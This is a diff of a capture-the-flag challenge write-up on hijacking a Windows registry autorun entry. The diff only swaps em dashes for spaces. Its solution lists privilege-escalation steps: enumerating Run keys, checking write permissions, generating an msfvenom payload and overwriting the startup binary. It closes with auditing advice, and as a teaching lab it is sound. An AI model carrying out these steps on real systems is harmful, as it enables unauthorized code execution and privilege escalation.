@@ -1,4 +1,4 @@
-# Challenge 3 — Registry Autorun Hijack
+# Challenge 3  Registry Autorun Hijack
 
 **Difficulty:** Medium
 **Category:** Windows Privilege Escalation
@@ -12,7 +12,7 @@ A system agent is configured to launch at startup via the Windows registry.
 The binary it points to sits in a directory you happen to be able to write to.
 Convince the machine to run your code at the next logon.
 
-You are `ctfplayer` — a standard user.
+You are `ctfplayer`  a standard user.
 
 ---
 
@@ -86,9 +86,9 @@ by logging off and back in as `ctfplayer` (or rebooting the VM).
 ## Solution
 
 <details>
-<summary>Click to reveal — try on your own first!</summary>
+<summary>Click to reveal  try on your own first!</summary>
 
-### Step 1 — Find the autorun entry
+### Step 1  Find the autorun entry
 
 ```powershell
 Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
@@ -99,7 +99,7 @@ Output:
 SysAgent : "C:\ProgramData\SysAgent\agent.exe"
 ```
 
-### Step 2 — Check file permissions
+### Step 2  Check file permissions
 
 ```powershell
 icacls "C:\ProgramData\SysAgent\agent.exe"
@@ -110,9 +110,9 @@ Output:
 ctfplayer:(F)
 ```
 
-Full control — we can overwrite the binary.
+Full control  we can overwrite the binary.
 
-### Step 3 — Generate the payload (on Kali)
+### Step 3  Generate the payload (on Kali)
 
 ```bash
 msfvenom -p windows/x64/exec \
@@ -120,7 +120,7 @@ msfvenom -p windows/x64/exec \
   -f exe -o agent.exe
 ```
 
-### Step 4 — Replace the binary
+### Step 4  Replace the binary
 
 Transfer `agent.exe` to the VM, then:
 
@@ -128,12 +128,12 @@ Transfer `agent.exe` to the VM, then:
 Copy-Item agent.exe "C:\ProgramData\SysAgent\agent.exe" -Force
 ```
 
-### Step 5 — Trigger the autorun
+### Step 5  Trigger the autorun
 
 Log off and log back in as `ctfplayer`.
 The registry autorun fires at logon, executing your binary.
 
-### Step 6 — Read the flag
+### Step 6  Read the flag
 
 ```powershell
 type C:\Users\Public\flag.txt
@@ -146,7 +146,7 @@ CTF{r3g1stry_4ut0run_h1j4ck3d}
 ### Why this works
 
 Autorun registry keys are a common persistence and privilege escalation vector.
-The binary being pointed to must be protected — writable only by Administrators.
+The binary being pointed to must be protected  writable only by Administrators.
 Always audit `HKLM\...\Run`, `HKCU\...\Run`, startup folders, and Winlogon keys
 as part of a privilege escalation assessment. The Sysinternals Autoruns tool
 highlights untrusted or unsigned autostart entries, making auditing straightforward.
